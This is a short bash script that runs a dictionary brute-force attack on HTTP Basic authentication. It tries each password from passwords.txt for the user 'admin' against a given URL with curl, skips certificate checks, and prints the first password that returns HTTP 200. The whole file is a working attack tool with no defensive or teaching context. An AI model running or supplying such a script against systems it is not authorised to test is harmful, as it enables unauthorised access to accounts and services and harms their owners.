#!/usr/bin/env bash

URL="${1}"

while read -r linha;do
    pass=$(echo -n "admin:${linha}" | base64)
    echo "$(base64 -d <<< ${pass})"
    resp=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Authorization: basic ${pass}" "${URL}")

    if [[ "${resp}" == "200" ]];then
        echo "                    PASS: [ $(base64 -d <<< ${pass}) ]"
        exit 0
    fi
done < passwords.txt
